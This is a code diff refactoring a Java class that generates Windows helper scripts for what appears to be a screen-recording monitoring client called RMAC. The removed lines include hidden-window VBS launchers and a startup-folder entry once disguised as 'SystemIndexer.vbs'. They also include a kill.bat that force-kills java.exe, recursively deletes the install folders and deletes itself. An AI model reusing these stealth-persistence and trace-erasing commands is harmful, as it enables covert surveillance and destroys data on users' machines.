@@ -2,11 +2,20 @@ package com.rmac.core;
 
 import com.rmac.RMAC;
 import com.rmac.utils.Constants;
-import java.io.File;
+import java.io.BufferedReader;
 import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.PrintStream;
+import java.lang.reflect.Field;
+import java.nio.file.StandardCopyOption;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Objects;
+import java.util.stream.Collectors;
 import lombok.extern.slf4j.Slf4j;
+import org.apache.commons.text.StringSubstitutor;
 
 /**
  * Verifies if all the script files exist and creates them otherwise.
@@ -25,7 +34,7 @@ import lombok.extern.slf4j.Slf4j;
  * <br>
  * This script forcefully kills the ffmpeg.exe process responsible for screen recording.
  * <br><br>
- * <code>run32.vbs</code>
+ * <code>background.vbs</code>
  * <br>
  * This script executes other scripts/cli-programs as a background process.
  * <br><br>
@@ -36,10 +45,6 @@ import lombok.extern.slf4j.Slf4j;
  * <code>restartrmac.bat</code>
  * <br>
  * This script re-starts the RMAC client executable as a background process.
- * <br><br>
- * <code>SysAdmin.vbs</code>
- * <br>
- * This script executes the <code>kill.bat</code> script as a background process.
  * <br><br>
  * <code>SysIndexer.vbs</code>
  * <br>
@@ -55,108 +60,40 @@ import lombok.extern.slf4j.Slf4j;
 public class ScriptFiles {
 
   public Thread thread;
-  public PrintStream run32_vbs;
-  public PrintStream systemindexer_vbs;
-  public PrintStream startrmac_bat;
-  public PrintStream restartrmac_bat;
-  public PrintStream kill_bat;
-  public PrintStream sysadmin_vbs;
-  public PrintStream kill_ffmpeg_bat;
 
   public ScriptFiles() {
     thread = new Thread(this::run, "ScriptFiles");
   }
 
+  /**
+   * Starts the script creation thread.
+   */
   public void start() {
     this.thread.start();
   }
 
+  /**
+   * Creates all the script files.
+   */
   public void run() {
     try {
-      this.createKillFFMPEG_Bat();
-      this.createRun32_Vbs();
-      this.createStartRMAC_Bat();
-      this.createRestartRMAC_Bat();
-      this.createSysAdmin_Vbs();
+      Map<String, String> values = new HashMap<>();
+      for (Field field : Constants.class.getFields()) {
+        values.put(field.getName(), (String) field.get(null));
+      }
+      StringSubstitutor substitutor = new StringSubstitutor(values);
+
+      copyScript("kill_ffmpeg.bat");
+      copyScript("background.vbs");
+      copyScript("start_rmac.bat", substitutor);
+      copyScript("restart_rmac.bat", substitutor);
       this.createSystemIndexer_Vbs();
       this.createKill_Bat();
 
       log.info("ScriptFiles successfully created");
-    } catch (IOException e) {
+    } catch (IOException | IllegalAccessException e) {
       log.error("ScriptFiles generation failed", e);
     }
-  }
-
-  /**
-   * Validate script file <code>kill_ffmpeg.exe</code>
-   *
-   * @throws FileNotFoundException when verification/correction fails.
-   */
-  public void createKillFFMPEG_Bat() throws IOException {
-    RMAC.fs.delete(Constants.SCRIPTS_LOCATION + "\\kill_ffmpeg.bat");
-    kill_ffmpeg_bat = RMAC.fs.getPrintStream(Constants.SCRIPTS_LOCATION + "\\kill_ffmpeg.bat");
-    kill_ffmpeg_bat.println("@echo off");
-    kill_ffmpeg_bat.println("PING 1.1.1.1 -n 1 -w 3000 >nul");
-    kill_ffmpeg_bat.println("taskkill /f /im ffmpeg.exe");
-    kill_ffmpeg_bat.println("PING 1.1.1.1 -n 1 -w 1000 >nul");
-  }
-
-  /**
-   * Validate script file <code>run32.vbs</code>
-   *
-   * @throws FileNotFoundException when verification/correction fails.
-   */
-  public void createRun32_Vbs() throws IOException {
-    RMAC.fs.delete(Constants.SCRIPTS_LOCATION + "\\run32.vbs");
-    run32_vbs = RMAC.fs.getPrintStream(Constants.SCRIPTS_LOCATION + "\\run32.vbs");
-    run32_vbs.println(
-        "CreateObject(\"WScript.Shell\").Run \"\"\"\" + WScript.Arguments(0) + \"\"\"\", 0, true"
-    );
-  }
-
-  /**
-   * Validate script file <code>startrmac.bat</code>
-   *
-   * @throws FileNotFoundException when verification/correction fails.
-   */
-  public void createStartRMAC_Bat() throws IOException {
-    RMAC.fs.delete(Constants.SCRIPTS_LOCATION + "\\startrmac.bat");
-    startrmac_bat = RMAC.fs.getPrintStream(Constants.SCRIPTS_LOCATION + "\\startrmac.bat");
-    startrmac_bat.println(
-        "start /B \"\" \"" + Constants.JRE_LOCATION + "\\bin\\java\" -jar \""
-            + Constants.CURRENT_LOCATION + "\\RMACClient.jar"
-            + "\" \"" + Constants.RUNTIME_LOCATION + "\""
-    );
-  }
-
-  /**
-   * Validate script file <code>restartrmac.bat</code>
-   *
-   * @throws FileNotFoundException when verification/correction fails.
-   */
-  public void createRestartRMAC_Bat() throws IOException {
-    RMAC.fs.delete(Constants.SCRIPTS_LOCATION + "\\restartrmac.bat");
-    restartrmac_bat = RMAC.fs.getPrintStream(Constants.SCRIPTS_LOCATION + "\\restartrmac.bat");
-    restartrmac_bat.println("timeout /t 3");
-    restartrmac_bat.println("taskkill /f /im java.exe");
-    restartrmac_bat.println("timeout /t 2");
-    restartrmac_bat.println(
-        "start /B \"\" \"" + Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs\""
-    );
-  }
-
-  /**
-   * Validate script file <code>SysAdmin.vbs</code>
-   *
-   * @throws FileNotFoundException when verification/correction fails.
-   */
-  public void createSysAdmin_Vbs() throws IOException {
-    RMAC.fs.delete(Constants.SCRIPTS_LOCATION + "\\SysAdmin.vbs");
-    sysadmin_vbs = RMAC.fs.getPrintStream(Constants.SCRIPTS_LOCATION + "\\SysAdmin.vbs");
-    sysadmin_vbs.println(
-        "CreateObject(\"WScript.Shell\").Run \"\"\"" + Constants.SCRIPTS_LOCATION
-            + "\\kill.bat\"\"\", 0, true"
-    );
   }
 
   /**
@@ -165,8 +102,9 @@ public class ScriptFiles {
    * @throws FileNotFoundException when verification/correction fails.
    */
   public void createSystemIndexer_Vbs() throws IOException {
-    RMAC.fs.delete(Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs");
-    systemindexer_vbs = RMAC.fs.getPrintStream(Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs");
+    RMAC.fs.delete(Constants.STARTUP_LOCATION + "\\rmac.vbs");
+    PrintStream systemindexer_vbs = RMAC.fs.getPrintStream(
+        Constants.STARTUP_LOCATION + "\\rmac.vbs");
     systemindexer_vbs.println(
         "CreateObject(\"Wscript.Shell\").Run \"\"\"" + Constants.JRE_LOCATION
             + "\\bin\\java\"\" -jar \"\"" + Constants.CURRENT_LOCATION
@@ -185,19 +123,41 @@ public class ScriptFiles {
    * @throws FileNotFoundException when verification/correction fails.
    */
   public void createKill_Bat() throws IOException {
-    RMAC.fs.delete(Constants.SCRIPTS_LOCATION + "\\kill.bat");
-    kill_bat = RMAC.fs.getPrintStream(Constants.SCRIPTS_LOCATION + "\\kill.bat");
-    kill_bat.println("timeout /t 4");
-    kill_bat.println("taskkill /f /im java.exe");
-    kill_bat.println("rd /s /q \"" + Constants.JRE_LOCATION + "\"");
-    kill_bat.println("rd /s /q \"" + Constants.SCRIPTS_LOCATION + "\"");
-    kill_bat.println("rd /s /q \"" + Constants.CONFIG_LOCATION + "\"");
-    kill_bat.println("del /f /q \"" + Constants.RUNTIME_LOCATION + "\\ffmpeg.exe\"");
-    kill_bat.println("del /f /q \"" + Constants.RUNTIME_LOCATION + "\\nircmd.exe\"");
-    kill_bat.println("rd /s /q \"" + Constants.MEGACMD_LOCATION + "\"");
-    kill_bat.println("del /f /q \"" + Constants.STARTUP_LOCATION + "\\SystemIndexer.vbs\"");
-    kill_bat.println("rd /q /s \"" + Constants.RUNTIME_LOCATION + "\\update\"");
-    kill_bat.println("rd /q /s \"" + Constants.CURRENT_LOCATION + "\"");
-    kill_bat.println("del \"%~f0\"");
+
+  }
+
+  public void copyScript(String script) {
+    try (InputStream is = RMAC.fs.getResourceAsStream(RMAC.class, "/scripts/" + script)) {
+      if (Objects.nonNull(is)) {
+        RMAC.fs.copy(
+            is, Constants.SCRIPTS_LOCATION + "\\" + script, StandardCopyOption.REPLACE_EXISTING
+        );
+      } else {
+        log.error("Could not copy script: {}", script);
+      }
+    } catch (IOException e) {
+      log.warn("Could not read script resource: {}", script, e);
+    }
+  }
+
+  public void copyScript(String script, StringSubstitutor substitutor) {
+    try (InputStream is = RMAC.fs.getResourceAsStream(RMAC.class, "/scripts/" + script)) {
+      if (Objects.nonNull(is)) {
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+        String scriptContent = substitutor.replace(
+            reader.lines().collect(Collectors.joining("\n"))
+        );
+
+        RMAC.fs
+            .getPrintStream(Constants.SCRIPTS_LOCATION + "\\" + script)
+            .println(scriptContent);
+
+        reader.close();
+      } else {
+        log.error("Could not copy script: {}", script);
+      }
+    } catch (IOException e) {
+      log.warn("Could not read script resource: {}", script, e);
+    }
   }
 }
